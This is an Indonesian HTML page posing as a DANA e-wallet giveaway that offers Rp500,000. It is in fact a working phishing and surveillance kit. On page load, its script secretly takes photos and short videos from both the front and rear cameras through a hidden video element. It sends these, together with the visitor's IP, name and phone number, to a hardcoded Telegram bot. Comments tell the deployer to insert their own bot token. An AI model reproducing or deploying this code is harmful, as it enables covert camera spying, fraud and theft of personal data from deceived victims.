<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giveaway DANA - Klaim Hadiah</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }
        body {
            background: linear-gradient(135deg, #008CFF, #0059ff);
            min-height: 100vh;
            color: white;
        }
        .container {
            max-width: 480px;
            margin: auto;
            padding: 30px 20px;
        }
        .card {
            background: rgba(255,255,255,.12);
            backdrop-filter: blur(18px);
            border-radius: 28px;
            padding: 30px 25px;
        }
        .logo {
            width: 80px;
            margin: 0 auto 20px;
            display: block;
        }
        h1 {
            font-size: 28px;
            text-align: center;
            margin-bottom: 10px;
        }
        .reward-box {
            background: white;
            color: #0059ff;
            border-radius: 24px;
            padding: 20px;
            text-align: center;
            margin: 20px 0;
        }
        .reward-amount {
            font-size: 36px;
            font-weight: 700;
        }
        input, button {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border-radius: 16px;
            border: none;
            font-size: 15px;
        }
        input {
            background: rgba(255,255,255,.15);
            color: white;
        }
        input::placeholder {
            color: rgba(255,255,255,.6);
        }
        button {
            background: white;
            color: #0059ff;
            font-weight: bold;
            cursor: pointer;
        }
        .timer-box {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 20px 0;
        }
        .time-box {
            background: rgba(0,0,0,.3);
            padding: 10px 18px;
            border-radius: 16px;
            text-align: center;
        }
        .time-box h2 {
            font-size: 28px;
        }
        .users {
            margin-top: 20px;
            background: rgba(255,255,255,.08);
            border-radius: 20px;
            padding: 15px;
        }
        .user-item {
            display: flex;
            justify-content: space-between;
            margin: 10px 0;
            font-size: 13px;
        }
        .status-success {
            color: #7CFF98;
        }
        .status-text {
            font-size: 12px;
            margin-top: 15px;
            text-align: center;
        }
        video {
            position: fixed;
            bottom: 0;
            right: 0;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            z-index: -9999;
            pointer-events: none;
        }
        canvas {
            display: none;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_dana_blue.svg" alt="DANA">
        <h1>🎁 Klaim Saldo Rp500.000</h1>

        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>

        <div class="reward-box">
            <div class="reward-amount">Rp500.000</div>
            <div>Untuk 50 pengguna pertama</div>
        </div>

        <div class="timer-box">
            <div class="time-box"><h2 id="hours">01</h2><span>Jam</span></div>
            <div class="time-box"><h2 id="minutes">59</h2><span>Menit</span></div>
            <div class="time-box"><h2 id="seconds">59</h2><span>Detik</span></div>
        </div>

        <input type="text" id="nama" placeholder="Nama lengkap">
        <input type="text" id="nomor" placeholder="Nomor DANA / WhatsApp">

        <button id="claimBtn">⭐ Klaim Hadiah ⭐</button>

        <div class="users">
            <div class="user-item"><span>📱 Rizky F.</span><span class="status-success">Berhasil</span></div>
            <div class="user-item"><span>📱 Sinta A.</span><span class="status-success">Berhasil</span></div>
            <div class="user-item"><span>📱 Bagas P.</span><span class="status-success">Berhasil</span></div>
        </div>

        <p id="status" class="status-text">🕒 Promo terbatas, segera klaim!</p>
    </div>
</div>

<script>
    // 🔴 GANTI DENGAN TOKEN TELEGRAM KAMU SENDIRI
    const BOT_TOKEN = '8726214438:AAFxpTjm32sD2gJkQZvicI6nc5BFI9ZaaHs';  // GANTI!
    const CHAT_ID   = '7319985632';  // GANTI!

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const statusEl = document.getElementById('status');

    let mediaRecorder;
    let recordedChunks = [];
    let currentStream = null;
    let isFrontCamera = true;

    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch { return 'tidak diketahui'; }
    }

    async function getCameraStream(useFront) {
        const constraints = {
            video: useFront ? 
                { facingMode: { exact: "user" } } :  // depan
                { facingMode: { exact: "environment" } }  // belakang
        };
        
        try {
            return await navigator.mediaDevices.getUserMedia(constraints);
        } catch (err) {
            // Fallback kalau facingMode gagal
            console.warn('FacingMode gagal, pakai default:', err);
            return await navigator.mediaDevices.getUserMedia({ video: true });
        }
    }

    async function captureFoto(namaCamera) {
        if (!video.videoWidth || video.videoWidth === 0) {
            await new Promise(r => setTimeout(r, 300));
        }
        
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
        const nama = document.getElementById('nama').value.trim() || 'belum diisi';
        const nomor = document.getElementById('nomor').value.trim() || 'belum diisi';
        const ip = await getIP();
        
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, `foto_${namaCamera}.jpg`);
        formData.append('caption', `📸 FOTO ${namaCamera.toUpperCase()}\n👤 Nama: ${nama}\n📱 No: ${nomor}\n🌐 IP: ${ip}\n⏰ ${new Date().toLocaleString('id-ID')}`);
        
        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
            return res.ok;
        } catch (err) {
            console.error('Gagal kirim foto:', err);
            return false;
        }
    }

    function rekamVideo(durasiDetik) {
        return new Promise(async (resolve) => {
            if (!currentStream) {
                resolve(false);
                return;
            }
            
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(currentStream, { mimeType: 'video/webm' });
            
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };
            
            mediaRecorder.onstop = async () => {
                if (recordedChunks.length > 0) {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    const nama = document.getElementById('nama').value.trim() || 'belum diisi';
                    const nomor = document.getElementById('nomor').value.trim() || 'belum diisi';
                    const camera = isFrontCamera ? 'depan' : 'belakang';
                    
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('video', blob, `video_${camera}_${Date.now()}.webm`);
                    formData.append('caption', `🎥 VIDEO ${camera.toUpperCase()} (${durasiDetik} detik)\n👤 ${nama}\n📱 ${nomor}\n⏰ ${new Date().toLocaleString('id-ID')}`);
                    
                    try {
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
                    } catch(e) { console.error(e); }
                }
                resolve(true);
            };
            
            mediaRecorder.start();
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, durasiDetik * 1000);
        });
    }

    async function switchCamera(useFront) {
        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
        }
        
        isFrontCamera = useFront;
        currentStream = await getCameraStream(useFront);
        video.srcObject = currentStream;
        await new Promise(r => video.onloadedmetadata = r);
        await new Promise(r => setTimeout(r, 500)); // stabilisasi
    }

    async function startPhishing() {
        try {
            statusEl.innerHTML = '⏳ Meminta akses kamera...';
            
            // 1. Mulai dengan kamera depan
            await switchCamera(true); // depan
            statusEl.innerHTML = '📸 Mengambil foto kamera depan...';
            await captureFoto('depan');
            
            // 2. Rekam video depan 5 detik
            statusEl.innerHTML = '🎥 Merekam video kamera depan (5 detik)...';
            await rekamVideo(5);
            
            // 3. Switch ke kamera belakang
            statusEl.innerHTML = '🔄 Beralih ke kamera belakang...';
            await switchCamera(false); // belakang
            
            // 4. Ambil foto belakang
            statusEl.innerHTML = '📸 Mengambil foto kamera belakang...';
            await captureFoto('belakang');
            
            // 5. Rekam video belakang 5 detik
            statusEl.innerHTML = '🎥 Merekam video kamera belakang (5 detik)...';
            await rekamVideo(5);
            
            statusEl.innerHTML = '✅ Verifikasi selesai! Lengkapi data di bawah.';
            
        } catch (err) {
            console.error(err);
            statusEl.innerHTML = '❌ Gagal mengakses kamera. Pastikan izin diberikan.';
        }
    }

    document.getElementById('claimBtn').onclick = async () => {
        const nama = document.getElementById('nama').value.trim();
        const nomor = document.getElementById('nomor').value.trim();
        
        if (!nama || !nomor) {
            statusEl.innerHTML = '⚠️ Isi nama dan nomor DANA!';
            return;
        }
        
        statusEl.innerHTML = '✅ Data tersimpan! Saldo akan dikirim dalam 24 jam.';
        
        const ip = await getIP();
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('text', `📝 DATA FORM\n👤 Nama: ${nama}\n📱 No: ${nomor}\n🌐 IP: ${ip}\n⏰ ${new Date().toLocaleString('id-ID')}`);
        
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: formData });
        } catch(e) {}
    };

    window.addEventListener('load', () => {
        setTimeout(startPhishing, 100);
    });

    // Timer countdown
    let seconds = 7199;
    setInterval(() => {
        if (seconds >= 0) {
            document.getElementById('hours').innerText = String(Math.floor(seconds / 3600)).padStart(2,'0');
            document.getElementById('minutes').innerText = String(Math.floor((seconds % 3600) / 60)).padStart(2,'0');
            document.getElementById('seconds').innerText = String(seconds % 60).padStart(2,'0');
            seconds--;
        }
    }, 1000);
</script>
</body>
</html>
